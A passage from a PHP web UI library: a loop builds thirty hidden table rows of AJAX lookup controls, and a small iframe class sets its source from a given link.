      for ($i = 1; $i <= 30; $i++) {
        $lookup_table->add(new table_row(array("id"    => $id.__HTML_CONTROL_NAME_SEPARATOR."line".__HTML_CONTROL_NAME_SEPARATOR.$i
                                              ,"style" => "display:none"
                                              )
                                        ,new table_cell(new lookup( array( "ajax_method"      => $ajax_method
                                                                         , "ajax_param"       => $ajax_param
                                                                         , "value"            => null
                                                                         , "text"             => null
                                                                         , "show_if_selected" => $id.__HTML_CONTROL_NAME_SEPARATOR."line".__HTML_CONTROL_NAME_SEPARATOR.($i+1)
                                                                         )
                                                                  , array( 'id' => $id.'['.($count + $i).']'
                                                                         )
                                                                  ))));
      }

      $this->add($lookup_table);
      

    } 
  }
  
}

class iframe extends html_iframe {
  
  function iframe($href, $attributes = array()) {

    $attributes['src'] = $href;
    parent::html_iframe($attributes);

  }

}


?>